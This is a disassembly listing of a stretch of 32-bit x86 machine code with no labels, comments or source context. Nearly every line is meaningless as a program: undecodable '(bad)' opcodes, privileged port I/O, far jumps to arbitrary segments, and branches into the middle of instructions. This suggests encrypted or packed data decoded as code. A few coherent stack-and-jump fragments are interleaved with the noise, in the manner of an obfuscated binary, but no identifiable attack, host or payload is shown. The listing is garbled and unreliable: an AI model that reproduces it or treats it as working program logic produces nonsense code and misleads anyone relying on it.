  4086e5:	cmp    eax,0x34b192ac
  4086ea:	mov    bh,0x0
  4086ec:	das    
  4086ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086ee:	ret    0xfcf0
  4086f1:	inc    ebp
  4086f2:	jmp    0x90041100
  4086f7:	mov    eax,ds:0xa1c0d1d4
  4086fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086fd:	add    ch,BYTE PTR [ebx]
  4086ff:	jbe    0x4086aa
  408701:	mov    bl,0x98
  408703:	call   0x3136:0x6ac6896b
  40870a:	mov    ah,0x98
  40870c:	test   al,0x9e
  40870e:	adc    ebx,DWORD PTR [esi+0x30]
  408711:	pop    ebx
  408712:	gs call 0x13fba1f7
  408718:	jp     0x4086df
  40871a:	or     ecx,DWORD PTR [ebx+0x69]
  40871d:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40871f:	jle    0x4086c2
  408721:	mov    DWORD PTR [edi],edx
  408723:	sub    al,0xfc
  408725:	pop    ebp
  408726:	int3   
  408727:	lds    edx,FWORD PTR [ebp+ebp*1+0x22]
  40872b:	int3   
  40872c:	(bad)  
  40872d:	rcl    DWORD PTR [ebp-0x7616b04b],0x7
  408734:	sub    bl,BYTE PTR [edi+0x34f8f63a]
  40873a:	fld    QWORD PTR [esi]
  40873c:	cmp    DWORD PTR [eax-0x5b86a6c3],edx
  408742:	mov    ecx,0xd3bb64fc
  408747:	xor    al,0xd5
  408749:	mov    dl,0xd1
  40874b:	sbb    dh,BYTE PTR ds:0x327cbb3e
  408751:	shl    DWORD PTR [ecx],cl
  408753:	or     DWORD PTR [ebx+0x4a7a9e52],ecx
  408759:	jge    0x4087a8
  40875b:	loopne 0x408766
  40875d:	mov    ecx,0xa4e2bdac
  408762:	mov    ?,WORD PTR [edx-0xd]
  408765:	cmp    ecx,ebx
  408767:	out    0x2a,eax
  408769:	ins    DWORD PTR es:[edi],dx
  40876a:	xchg   ecx,eax
  40876b:	xchg   ebp,eax
  40876c:	pop    edi
  40876d:	ror    bl,0xef
  408770:	sbb    al,0x18
  408772:	sub    dl,dh
  408774:	jl     0x40878b
  408776:	(bad)  
  408777:	fstp   st(5)
  408779:	aaa    
  40877a:	sbb    ah,BYTE PTR [edi]
  40877c:	push   esi
  40877d:	outs   dx,BYTE PTR ds:[esi]
  40877e:	jbe    0x408734
  408780:	inc    eax
  408781:	mov    esp,0x52934ec3
  408786:	js     0x408735
  408788:	pop    ecx
  408789:	(bad)  
  40878a:	outs   dx,DWORD PTR ds:[si]
  40878c:	sbb    eax,0x491ef9df
  408791:	add    cl,0xfd
  408794:	pop    ds
  408795:	xor    BYTE PTR [edi-0x14],bh
  408798:	(bad)  
  408799:	arpl   WORD PTR [ecx+ebp*2+0x6e5df304],dx
  4087a0:	xor    edx,0xe300a415
  4087a6:	(bad)  
  4087a7:	leave  
  4087a8:	retf   0xbf53
  4087ab:	pop    ss
  4087ac:	adc    BYTE PTR [ecx+0x65a9293b],bh
  4087b2:	in     eax,dx
  4087b3:	mov    esi,0xf9669985
  4087b8:	sahf   
  4087b9:	aaa    
  4087ba:	and    ch,0x49
  4087bd:	arpl   WORD PTR [ebp+0x77],sp
  4087c0:	bound  ebx,QWORD PTR ds:[edx+ebx*1+0x12077833]
  4087c8:	cli    
  4087c9:	data16 rcl BYTE PTR [esi+0x5b],1
  4087cd:	push   esp
  4087ce:	div    BYTE PTR [eax+0x49]
  4087d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087d2:	imul   ebx,DWORD PTR [esi],0x56290f68
  4087d8:	icebp  
  4087d9:	or     ah,al
  4087db:	lea    edi,[ebx]
  4087dd:	inc    eax
  4087de:	adc    al,0xc8
  4087e0:	mov    edi,0xeb1a4959
  4087e5:	push   cs
  4087e6:	js     0x408832
  4087e8:	xchg   ebx,eax
  4087e9:	jmp    0xa4268fd2
  4087ee:	push   0xffffff8a
  4087f0:	mov    ecx,DWORD PTR [ebx-0x77]
  4087f3:	(bad)  
  4087f4:	fcmovbe st,st(5)
  4087f6:	loope  0x408795
  4087f8:	or     dl,bl
  4087fa:	outs   dx,DWORD PTR ds:[esi]
  4087fb:	out    0x50,eax
  4087fd:	xchg   ebp,eax
  4087fe:	cmp    BYTE PTR [ecx+0x3a52e794],al
  408804:	outs   dx,BYTE PTR ds:[esi]
  408805:	int3   
  408806:	imul   esi,DWORD PTR [edi+0x45],0xd3df115e
  40880d:	sub    bl,al
  40880f:	cdq    
  408810:	repnz es scas al,BYTE PTR es:[edi]
  408813:	arpl   WORD PTR [esi],ax
  408815:	inc    edx
  408816:	loope  0x4087f0
  408818:	popa   
  408819:	jge    0x4087b2
  40881b:	dec    ebp
  40881c:	jne    0x408822
  40881e:	loop   0x4087ec
  408820:	mov    ebx,0x62fa75db
  408825:	rcr    al,0x53
  408828:	push   es
  408829:	push   ebx
  40882a:	aam    0x84
  40882c:	sub    DWORD PTR [ecx-0x61],ecx
  40882f:	inc    eax
  408830:	mov    esp,esp
  408832:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408833:	sub    eax,0xa3a7c976
  408838:	xor    al,0x46
  40883a:	test   eax,0xbcd6ff06
  40883f:	test   ebp,esp
  408841:	jo     0x40889f
  408843:	aam    0xb4
  408845:	add    edx,DWORD PTR [eax+0x2c]
  408848:	rcr    BYTE PTR [eax+0x10],0xf5
  40884c:	mov    eax,DWORD PTR [ebp-0x18]
  40884f:	add    eax,0xaa
  408854:	push   eax
  408855:	jmp    0x408d60
  40885a:	ror    esp,cl
  40885c:	ror    eax,cl
  40885e:	ror    edi,cl
  408860:	rcl    ebx,cl
  408862:	retf   
  408863:	rol    ecx,1
  408865:	into   
  408866:	sbb    DWORD PTR [eax+0x41],esp
  408869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40886a:	fsubp  st(7),st
  40886c:	js     0x4088e6
  40886e:	push   0x7c
  408870:	js     0x4088ea
  408872:	leave  
  408873:	mov    DWORD PTR [ebx-0x77],ebp
  408876:	inc    esi
  408877:	and    BYTE PTR [esi+0x4009ca0a],bh
  40887d:	mov    WORD PTR [eax-0xf],gs
  408880:	push   ecx
  408881:	repz dec ebx
  408883:	push   eax
  408884:	adc    BYTE PTR [edi],bh
  408886:	retf   0x736c
  408889:	and    BYTE PTR [edi+0x1b0e75fa],ch
  40888f:	pop    ebp
  408890:	fst    DWORD PTR [edx+0x132a0aba]
  408896:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408897:	ss std 
  408899:	xor    BYTE PTR [ecx],bl
  40889b:	cwde   
  40889c:	jg     0x4088ab
  40889e:	jae    0x408837
  4088a0:	jmp    0xdc3f2c3f
  4088a5:	and    al,0xb9
  4088a7:	loopne 0x4088c1
  4088a9:	push   esp
  4088aa:	dec    esi
  4088ab:	mov    dl,0xfb
  4088ad:	mov    ds:0x82a676d,eax
  4088b2:	jne    0x4088d1
  4088b4:	and    BYTE PTR [edx+0x4f9baac],cl
  4088ba:	test   DWORD PTR [esi],ebp
  4088bc:	pextrw eax,(bad),0xc5
  4088be:	inc    eax
  4088bf:	in     eax,dx
  4088c0:	test   al,0x3b
  4088c2:	push   esi
  4088c3:	pop    ebp
  4088c4:	add    DWORD PTR [ecx+0x5],0x64c64d56
  4088cb:	pop    ebx
  4088cc:	fs pop ds
  4088ce:	test   ebx,esp
  4088d0:	loopne 0x408861
  4088d2:	out    0x12,eax
  4088d4:	pop    esp
  4088d5:	sub    al,0xcf
  4088d7:	add    dh,BYTE PTR [ebx+0x3]
  4088da:	cmp    DWORD PTR [edi+esi*4+0x116cc8b5],edi
  4088e1:	(bad)  
  4088e2:	stos   DWORD PTR es:[edi],eax
  4088e3:	add    eax,0x11e9891d
  4088e8:	int3   
  4088e9:	into   
  4088ea:	sub    al,0x47
  4088ec:	mov    ah,0x29
  4088ee:	xor    ch,al
  4088f0:	or     BYTE PTR [ecx],ch
  4088f2:	bswap  ebx
  4088f4:	loope  0x408876
  4088f6:	lds    ebx,FWORD PTR [edx+0x34]
  4088f9:	cwde   
  4088fa:	inc    esi
  4088fb:	hlt    
  4088fc:	fs fs ss push edi
  408900:	xor    BYTE PTR [edx],ch
  408902:	pop    edi
  408903:	daa    
  408904:	in     al,dx
  408905:	shr    BYTE PTR [esi],cl
  408907:	out    dx,al
  408908:	or     eax,0x6f3e62db
  40890d:	mov    ds:0x81cd48f4,al
  408912:	push   0x1c
  408914:	shr    DWORD PTR [ebx],0x3e
  408917:	add    DWORD PTR [ecx],edi
  408919:	cdq    
  40891a:	lds    esp,FWORD PTR [edx+esi*1]
  40891d:	lods   eax,DWORD PTR ds:[esi]
  40891e:	loopne 0x40893a
  408920:	loop   0x408964
  408922:	jge    0x4088b6
  408924:	sbb    BYTE PTR [edi-0x59],al
  408927:	leave  
  408928:	ds sub cl,bl
  40892b:	fmul   QWORD PTR [esi+0x30]
  40892e:	pop    ebp
  40892f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408930:	out    0x66,al
  408932:	mov    al,ds:0x38062c22
  408937:	dec    esp
  408938:	or     ebx,ecx
  40893a:	(bad)  
  40893b:	(bad)  
  40893c:	fidiv  WORD PTR [ebx]
  40893e:	popf   
  40893f:	aaa    
  408940:	sub    al,BYTE PTR ds:0x3e889c76
  408946:	jb     0x40892b
  408948:	pop    ds
  408949:	(bad)  
  40894b:	gs (bad) 
  40894d:	lock daa 
  40894f:	in     eax,0x5e
  408951:	cdq    
  408952:	jo     0x408936
  408954:	adc    BYTE PTR [esi],0x8f
  408957:	imul   esi,DWORD PTR [eax-0x50e87e5a],0xffffff8d
  40895e:	mov    esi,0x25ee0344
  408963:	pop    ds
  408964:	lea    ecx,[ecx]
  408966:	test   eax,0x55480c64
  40896b:	shl    dl,0x8c
  40896e:	rcl    BYTE PTR [edx],0x82
  408971:	add    al,0xad
  408973:	and    al,BYTE PTR [esi+eax*1-0x3c]
  408977:	add    DWORD PTR [edi+0x5b],esi
  40897a:	call   0xbcc7:0x411139b2
  408981:	sub    dh,ch
  408983:	nop
  408984:	pop    ss
  408985:	push   0xd
  408987:	push   0xffffffb7
  408989:	dec    edi
  40898a:	xor    eax,0x2ceb8a5c
  40898f:	mov    ch,0x62
  408991:	lea    esp,[eax-0x2]
  408994:	dec    ebx
  408995:	and    DWORD PTR [edx+eiz*1+0x67],ecx
  408999:	imul   BYTE PTR [esi+0x25]
  40899c:	pusha  
  40899d:	mov    cl,0x1
  40899f:	mov    ah,0x4e
  4089a1:	sub    ebx,esi
  4089a3:	in     al,dx
  4089a4:	xchg   ecx,eax
  4089a5:	stos   BYTE PTR es:[edi],al
  4089a6:	or     DWORD PTR [ebp+0x29455e34],edi
  4089ac:	cmp    eax,0xe79c0659
  4089b1:	mov    edi,0x158e9277
  4089b6:	cmp    eax,0xc690437f
  4089bb:	adc    cl,BYTE PTR [ebp-0x74]
  4089be:	and    ebx,0xfc35be5b
  4089c4:	mov    esp,0xea3effce
  4089c9:	mov    al,ds:0x4765a0dd
  4089ce:	jno    0x408a41
  4089d0:	adc    al,cl
  4089d2:	lods   al,BYTE PTR ds:[esi]
  4089d3:	add    ch,BYTE PTR [ebx]
  4089d5:	push   ss
  4089d6:	inc    eax
  4089d7:	retf   0x9749
  4089da:	call   0x73b5:0x8a308953
  4089e1:	cmp    al,0x90
  4089e3:	and    ebx,DWORD PTR [ebx]
  4089e5:	fstp   TBYTE PTR [eax]
  4089e7:	out    dx,al
  4089e8:	js     0x4089ff
  4089ea:	aam    0xd6
  4089ec:	push   edi
  4089ed:	pusha  
  4089ee:	mov    dl,0xd4
  4089f0:	nop
  4089f1:	loop   0x408a67
  4089f3:	arpl   WORD PTR [ecx+esi*4+0x606a2948],bx
  4089fa:	repz sbb edi,DWORD PTR [ecx+0x6a]
  4089fe:	loop   0x4089db
  408a00:	sbb    edx,DWORD PTR [esi-0x7043c1a8]
  408a06:	sub    edx,DWORD PTR [ebx-0x336542de]
  408a0c:	jno    0x408a42
  408a0e:	sti    
  408a0f:	in     al,0x6b
  408a11:	sbb    eax,0xd6550d23
  408a16:	fcmovnb st,st(0)
  408a18:	pop    es
  408a19:	mov    bh,0xa2
  408a1b:	in     al,0x46
  408a1d:	movzx  eax,WORD PTR [ebp-0x6b]
  408a21:	sar    BYTE PTR [ebx-0x10eb156c],cl
  408a27:	mov    ds:0x662eb362,al
  408a2c:	into   
  408a2d:	(bad)  
  408a2e:	inc    ebp
  408a2f:	div    dl
  408a31:	jge    0x408a6f
  408a33:	sub    DWORD PTR [ebx+0x39],ebx
  408a36:	mov    edi,eax
  408a38:	cmp    DWORD PTR cs:[ecx],eax
  408a3b:	push   0x15
  408a3d:	inc    edi
  408a3e:	or     eax,0xc451f349
  408a43:	jo     0x408a15
  408a45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a46:	cmp    DWORD PTR [ecx],ebp
  408a48:	xchg   ebx,eax
  408a49:	lods   al,BYTE PTR ds:[esi]
  408a4a:	retf   
  408a4b:	mov    cl,0x7d
  408a4d:	mov    eax,ds:0xbb519cbf
  408a52:	das    
  408a53:	out    dx,eax
  408a54:	sbb    DWORD PTR [edx-0x16],eax
  408a57:	sahf   
  408a58:	cmp    BYTE PTR [edx-0x7d31212c],bl
  408a5e:	inc    edi
  408a5f:	xor    al,0x7a
  408a61:	hlt    
  408a62:	xchg   esp,eax
  408a63:	neg    ebp
  408a65:	sar    bh,cl
  408a67:	add    ah,cl
  408a69:	push   0x89837963
  408a6e:	cmp    bh,BYTE PTR [esi-0x7e7340a6]
  408a74:	daa    
  408a75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a76:	inc    eax
  408a77:	loope  0x408a3e
  408a79:	ss loop 0x408aa4
  408a7c:	ficomp DWORD PTR [eax]
  408a7e:	jns    0x408af8
  408a80:	rcl    BYTE PTR [ebx+edi*1-0x7b51059d],1
  408a87:	mov    dh,0xa2
  408a89:	sti    
  408a8a:	sbb    dl,cl
  408a8c:	mov    dl,0x47
  408a8e:	push   ds
  408a8f:	aaa    
  408a90:	add    BYTE PTR [esi],dh
  408a92:	mov    ebp,0x31fae4c0
  408a97:	aad    0x5e
  408a99:	(bad)  
  408a9a:	ror    BYTE PTR ds:0xb99dba91,1
  408aa0:	pop    ecx
  408aa1:	ins    BYTE PTR es:[edi],dx
  408aa2:	push   0xffffffc2
  408aa4:	retf   
  408aa5:	mov    ah,BYTE PTR [eax+0x12]
  408aa8:	push   ebx
  408aa9:	fmulp  st(5),st
  408aab:	cmp    eax,0xb14cd4d5
  408ab0:	mov    ebp,DWORD PTR [ebp+0x25c749cb]
  408ab6:	jge    0x408aa6
  408ab8:	add    al,0x85
  408aba:	push   cs
  408abb:	(bad)  
  408abc:	std    
  408abd:	jg     0x408b06
  408abf:	imul   ebp,DWORD PTR [ecx],0x6c3260bd
  408ac5:	js     0x408a60
  408ac7:	ins    BYTE PTR es:[edi],dx
  408ac8:	mov    ds:0xa47ebe86,eax
  408acd:	inc    ecx
  408ace:	fwait
  408acf:	mov    ecx,0x680e8d41
  408ad4:	dec    ecx
  408ad5:	cmp    bl,0x5d
  408ad8:	shl    DWORD PTR [edi-0x33b9337],cl
  408ade:	mov    bh,0x4b
  408ae0:	call   0xdf1fa336
  408ae5:	inc    eax
  408ae6:	inc    edx
  408ae7:	xchg   ecx,eax
  408ae8:	shl    eax,0x9b
  408aeb:	sub    DWORD PTR [edx-0x55],0xffffffcd
  408aef:	inc    esi
  408af0:	dec    edx
  408af1:	or     edx,esp
  408af3:	sti    
  408af4:	sub    DWORD PTR [edi+0x4ca3adc2],ecx
  408afa:	sub    eax,0x2ee39ef
  408aff:	pop    ebp
  408b00:	push   edi
  408b01:	addr16 cmp edi,ebx
  408b04:	or     DWORD PTR [edi+0x51780ae],esi
  408b0a:	push   0x6a
  408b0c:	cmp    dh,al
  408b0e:	or     BYTE PTR [esi],bh
  408b10:	add    al,BYTE PTR [esi]
  408b12:	mov    ecx,ds
  408b14:	xchg   esp,eax
  408b15:	mov    eax,0x30907382
  408b1a:	cli    
  408b1b:	and    al,0x4e
  408b1d:	pop    ecx
  408b1e:	or     eax,0xabe4beed
  408b23:	and    ah,BYTE PTR [esi+ebx*8+0x53b1b8d]
  408b2a:	adc    eax,0x8a7157b9
  408b2f:	scas   eax,DWORD PTR es:[edi]
  408b30:	and    ebx,DWORD PTR [edi-0x178ad658]
  408b36:	aad    0xbd
  408b38:	dec    edx
  408b39:	push   ecx
  408b3a:	ins    BYTE PTR es:[edi],dx
  408b3b:	sub    al,0xe0
  408b3d:	push   edi
  408b3e:	clc    
  408b3f:	sbb    edi,ebx
  408b41:	or     BYTE PTR [edx+0x6b],cl
  408b44:	mov    bh,BYTE PTR [edx-0x20]
  408b47:	cmp    BYTE PTR [edx+0x20a1ffcb],bh
  408b4d:	push   edx
  408b4e:	aaa    
  408b4f:	or     BYTE PTR [eax-0x2a],al
  408b52:	add    esi,DWORD PTR [esi]
  408b54:	arpl   WORD PTR [edi],si
  408b56:	jmp    0x408b94
  408b58:	out    0xb5,eax
  408b5a:	inc    edi
  408b5b:	ds inc edx
  408b5d:	jnp    0x408bb8
  408b5f:	dec    esi
  408b60:	aam    0x8e
  408b62:	cli    
  408b63:	fs and al,0x5d
  408b66:	call   0x14b4:0x82ddd9fc
  408b6d:	inc    ebp
  408b6e:	sar    BYTE PTR [edi],1
  408b70:	pusha  
  408b71:	jmp    0xbf0f:0xcaf4e014
  408b78:	mov    dh,0xdb
  408b7a:	and    al,0x68
  408b7c:	push   es
  408b7d:	pop    ds
  408b7e:	popa   
  408b7f:	jnp    0x408bd0
  408b81:	mov    dl,0xf8
  408b83:	adc    DWORD PTR [ebp-0x60f7aa33],0xe9e92802
  408b8d:	enter  0x3424,0x8e
  408b91:	jmp    0xda19fec0
  408b96:	ror    eax,1
  408b98:	mov    bl,0xdc
  408b9a:	scas   eax,DWORD PTR es:[di]
  408b9c:	jns    0x408b2e
  408b9e:	into   
  408b9f:	bound  ebx,QWORD PTR [edx]
  408ba1:	pop    edx
  408ba2:	dec    edx
  408ba3:	jle    0x408b8a
  408ba5:	sbb    DWORD PTR [eax+0x34],ebp
  408ba8:	jecxz  0x408c07
  408baa:	inc    eax
  408bab:	sar    BYTE PTR ds:0x1a14fc08,cl
  408bb1:	mov    edx,0xa2ad5c3a
  408bb6:	lds    esp,FWORD PTR [eax]
  408bb8:	mov    ecx,DWORD PTR [ecx]
  408bba:	or     al,0xac
  408bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bbd:	cmp    DWORD PTR [ebx+ebp*2+0x2],esp
  408bc1:	mov    cl,0x5a
  408bc3:	jp     0x408c06
  408bc5:	pop    edx
  408bc6:	mov    ds:0x9430dd62,eax
  408bcb:	dec    ecx
  408bcc:	mov    dh,0x71
  408bce:	push   ebp
  408bcf:	out    dx,al
  408bd0:	xor    BYTE PTR ds:0x2cbb7ba6,cl
  408bd6:	pusha  
  408bd7:	xchg   ebx,eax
  408bd8:	mov    esp,0xf0772c03
  408bdd:	xor    al,0xf2
  408bdf:	shr    edi,0x6
  408be2:	adc    BYTE PTR [ebx],0x98
  408be5:	cli    
  408be6:	push   ds
  408be7:	inc    ebx
  408be8:	aas    
  408be9:	(bad)  
  408bea:	fisub  WORD PTR [eax-0x19]
  408bed:	mov    eax,ds:0x854346e0
  408bf2:	repnz out dx,eax
  408bf4:	les    eax,FWORD PTR [esi-0x7b]
  408bf7:	idiv   DWORD PTR [edx-0xf6e4915]
  408bfd:	add    BYTE PTR [ecx],al
  408bff:	into   
  408c00:	mov    ebp,edi
  408c02:	push   ecx
  408c03:	je     0x408c77
  408c05:	xor    DWORD PTR [esi-0x59],0x4717857f
  408c0c:	pop    edx
  408c0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c0e:	retf   
  408c0f:	push   DWORD PTR [ecx+0x63]
  408c12:	push   0x1791bd7e
  408c17:	xchg   ebp,eax
  408c18:	pop    eax
  408c19:	push   esp
  408c1a:	and    ebp,DWORD PTR [eax]
  408c1c:	sub    BYTE PTR [edi-0x75373f1f],dl
  408c22:	mov    ?,WORD PTR [ebp+0x3bfc19f4]
  408c28:	jnp    0x408c7c
  408c2a:	dec    edi
  408c2b:	(bad)  
  408c2c:	std    
  408c2d:	rcl    DWORD PTR [ebp+esi*8-0x18],0xe
  408c32:	icebp  
  408c33:	mov    eax,0xd2f8270e
  408c38:	pop    esp
  408c39:	pop    eax
  408c3a:	lods   al,BYTE PTR ds:[esi]
  408c3b:	iret   
  408c3c:	and    esi,DWORD PTR [esi]
  408c3e:	aad    0x98
  408c40:	(bad)  
  408c41:	hlt    
  408c42:	sar    BYTE PTR ds:0xfc53beff,cl
  408c48:	hlt    
  408c49:	(bad)
  408c4d:	daa    
  408c4e:	stc    
  408c4f:	jbe    0x408c3e
  408c51:	adc    dh,BYTE PTR [ecx]
  408c53:	mov    WORD PTR [ebp-0x52],gs
  408c56:	xchg   edx,eax
  408c57:	inc    esi
  408c58:	inc    edi
  408c59:	or     eax,0x1375e87c
  408c5e:	test   DWORD PTR [edx-0x41],ebp
  408c61:	rcl    DWORD PTR [edx+0x8620fec],cl
  408c67:	push   esi
  408c68:	push   eax
  408c69:	out    dx,al
  408c6a:	mov    dh,0xa1
  408c6c:	jecxz  0x408bf6
  408c6e:	adc    eax,0x1186622e
  408c73:	cdq    
  408c74:	pushf  
  408c75:	int    0x41
  408c77:	pop    ebx
  408c78:	jnp    0x408c02
  408c7a:	in     al,0xbf
  408c7c:	lods   eax,DWORD PTR ds:[esi]
  408c7d:	xor    ebp,DWORD PTR [esi+0x48]
  408c80:	mov    dh,0x99
  408c82:	sbb    DWORD PTR [edx+0x5f73c259],ebp
  408c88:	ficom  DWORD PTR [ecx-0x5916f0e7]
  408c8e:	or     BYTE PTR [edx-0xe],dl
  408c91:	out    0x8e,al
  408c93:	std    
  408c94:	aam    0xc7
  408c96:	iret   
  408c97:	pop    es
  408c98:	cld    
  408c99:	jmp    0xa06c:0x531af63e
  408ca0:	xchg   BYTE PTR [esi],dh
  408ca2:	js     0x408d22
  408ca4:	aam    0x6d
  408ca6:	mov    WORD PTR [ecx+esi*1-0x6],ds
  408caa:	shr    DWORD PTR [esi],cl
  408cac:	mov    bl,0x36
  408cae:	test   BYTE PTR [ecx-0x17073ca7],0xa3
  408cb5:	adc    ecx,DWORD PTR ds:0x68686db5
  408cbb:	mov    BYTE PTR [esi+0x6e7d0880],bh
  408cc1:	je     0x408c67
  408cc3:	rol    dl,0xa4
  408cc6:	or     DWORD PTR [eax],0xffffff81
  408cc9:	pop    ebx
  408cca:	sti    
  408ccb:	mov    ebp,0x3dbcd747
  408cd0:	pusha  
  408cd1:	sar    DWORD PTR [ecx],cl
  408cd3:	jl     0x408d53
  408cd5:	stos   DWORD PTR es:[edi],eax
  408cd6:	pop    eax
  408cd7:	inc    ebx
  408cd8:	push   ebp
  408cd9:	aad    0xbe
  408cdb:	pop    ebx
  408cdc:	cmp    esi,edi
  408cde:	out    dx,eax
  408cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ce0:	cld    
  408ce1:	lea    ebp,[ebx]
  408ce3:	dec    eax
  408ce4:	mov    ebx,0x8d7a0d1b
  408ce9:	out    0xce,eax
  408ceb:	stos   BYTE PTR es:[edi],al
  408cec:	dec    ebx
  408ced:	sub    al,0x24
  408cef:	scas   eax,DWORD PTR es:[edi]
  408cf0:	inc    edi
  408cf1:	fisubr DWORD PTR [edi-0x2b9892b4]
  408cf7:	inc    eax
  408cf8:	mov    esp,0x8f3479bd
  408cfd:	adc    ebp,eax
  408cff:	push   esi
  408d00:	imul   eax,DWORD PTR [edi-0x371abf50],0x2a
  408d07:	cs cmc 
  408d09:	xchg   esi,eax
  408d0a:	lods   al,BYTE PTR ds:[esi]
  408d0b:	shr    BYTE PTR [eax],1
  408d0d:	dec    esp
  408d0e:	push   cs
  408d0f:	out    0xf2,eax
  408d11:	and    BYTE PTR [edi+0x70bb08da],al
  408d17:	(bad)  
  408d19:	pop    ds
  408d1a:	push   cs
  408d1b:	out    dx,al
  408d1c:	mov    eax,ds:0xd9c82258
  408d21:	not    DWORD PTR [ebx+0x26]
  408d24:	add    edi,DWORD PTR [esi]
  408d26:	adc    bh,BYTE PTR [eax]
  408d28:	pop    esi
  408d29:	jmp    0x408d5f
  408d2b:	loop   0x408d5c
  408d2d:	xchg   esi,eax
  408d2e:	jge    0x408cc1
  408d30:	add    DWORD PTR ds:0xf911cdb1,ecx
  408d36:	cwd    
  408d38:	xlat   BYTE PTR ds:[ebx]
  408d39:	xchg   esp,eax
  408d3a:	mov    al,0xc
  408d3d:	mov    ds:0x22602cd1,eax
  408d42:	jmp    0x5acb569d
  408d47:	xor    eax,edx
  408d49:	shl    bh,1
  408d4b:	ins    DWORD PTR es:[edi],dx
  408d4c:	inc    edi
  408d4d:	lahf   
  408d4e:	retf   0xb1cb
  408d51:	mov    bl,0x5b
  408d53:	fidivr DWORD PTR [ecx-0x1dd7e85]
  408d59:	lds    ebx,FWORD PTR [esi+eiz*8+0x51e2f033]
  408d60:	mov    eax,DWORD PTR [ebp-0x18]
  408d63:	mov    eax,DWORD PTR [eax+0x198]
  408d69:	push   DWORD PTR [eax]
  408d6b:	jmp    0x409276
  408d70:	ret    0x3ccb
  408d73:	ret    
  408d74:	leave  
  408d75:	retf   
  408d76:	ror    ecx,0x4f
  408d79:	(bad)  
  408d7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d7b:	(bad)  
  408d7c:	ins    DWORD PTR es:[edi],dx
  408d7d:	sar    BYTE PTR [ecx-0x72],cl
  408d80:	enter  0x78f2,0x78
  408d84:	push   0x7c
  408d86:	js     0x408e00
  408d88:	in     al,0x1c
  408d8a:	pop    edx
  408d8b:	gs dec eax
  408d8d:	scas   al,BYTE PTR es:[edi]
  408d8e:	and    bh,BYTE PTR [ebp+0x2b]
  408d91:	pop    ecx
  408d92:	mov    BYTE PTR [ebx+0x601a3763],dh
  408d98:	mov    edx,0xd41a0833
  408d9d:	scas   eax,DWORD PTR es:[edi]
  408d9e:	js     0x408dcf
  408da0:	pusha  
  408da1:	outs   dx,BYTE PTR ds:[esi]
  408da2:	add    ebx,esp
  408da4:	icebp  
  408da5:	scas   eax,DWORD PTR es:[edi]
  408da6:	call   0xe93c8fa1
  408dab:	push   cs
  408dac:	stos   DWORD PTR es:[edi],eax
  408dad:	jns    0x408d9e
  408daf:	out    0x12,eax
  408db1:	fdiv   QWORD PTR [esi-0x7e8639e0]
  408db7:	jno    0x408d7a
  408db9:	ror    ah,cl
  408dbb:	scas   al,BYTE PTR es:[edi]
  408dbc:	aad    0x35
  408dbe:	imul   edi,DWORD PTR [eax+0x18],0xdceb81d3
  408dc5:	mov    cs,WORD PTR [edx]
  408dc7:	sub    DWORD PTR [edx],ebp
  408dc9:	pop    ecx
  408dca:	popf   
  408dcb:	ficom  WORD PTR [ebx+0x1aa9259c]
  408dd1:	xchg   esp,eax
  408dd2:	outs   dx,DWORD PTR ds:[esi]
  408dd3:	dec    esi
  408dd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dd5:	pop    edi
  408dd6:	jae    0x408e1f
  408dd8:	mov    edx,0xbbff1b83
  408ddd:	repnz ins DWORD PTR es:[edi],dx
  408ddf:	pop    esp
  408de0:	(bad)  
  408de1:	rcl    edi,cl
  408de3:	hlt    
  408de4:	lea    edi,[ebx-0x78bee751]
  408dea:	adc    al,BYTE PTR [edi+0x6480ef40]
  408df0:	push   ebx
  408df1:	pop    ebp
  408df2:	mov    edi,0x743012de
  408df7:	stc    
  408df8:	stos   BYTE PTR es:[edi],al
  408df9:	add    cl,BYTE PTR [eax+eiz*2+0x6366435]
  408e00:	xchg   edi,eax
  408e01:	cld    
  408e02:	sbb    eax,0x463934d8
  408e07:	out    0x5e,eax
  408e09:	out    dx,eax
  408e0a:	out    dx,eax
  408e0b:	pusha  
  408e0c:	test   dh,bh
  408e0e:	mov    ds:0x4d4a1946,al
  408e13:	dec    edx
  408e14:	cwde   
  408e15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e16:	inc    edi
  408e17:	out    dx,al
  408e18:	mov    ch,0x3d
  408e1a:	jg     0x408dc9
  408e1c:	xor    BYTE PTR [ecx+0x4cb69079],al
  408e22:	and    eax,0xcf84e16a
  408e27:	pop    edx
  408e28:	or     esp,DWORD PTR [edx-0x52c73118]
  408e2e:	outs   dx,DWORD PTR ds:[esi]
  408e2f:	mov    ds:0x5c4c9a08,al
  408e34:	outs   dx,BYTE PTR ds:[esi]
  408e35:	inc    edx
  408e36:	xchg   esi,eax
  408e37:	inc    esp
  408e38:	repz cdq 
  408e3a:	cmp    eax,0x7f90410c
  408e3f:	retf   
  408e40:	pop    ss
  408e41:	repnz cwde 
  408e43:	mov    edi,0xaaa29b8a
  408e48:	shr    BYTE PTR [edi+0x17],0x60
  408e4c:	jo     0x408e91
  408e4e:	inc    edi
  408e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e50:	cmp    BYTE PTR [esi],bh
  408e52:	aaa    
  408e53:	test   DWORD PTR [ecx-0x72],0x47bfed5
  408e5a:	dec    ecx
  408e5b:	scas   eax,DWORD PTR es:[edi]
  408e5c:	gs pop ds
  408e5e:	mov    ecx,0xe007106
  408e63:	push   esi
  408e64:	nop
  408e65:	jnp    0x408e50
  408e67:	add    al,0xe3
  408e69:	fwait
  408e6a:	leave  
  408e6b:	pop    es
  408e6c:	jo     0x408ede
  408e6e:	aaa    
  408e6f:	dec    ebx
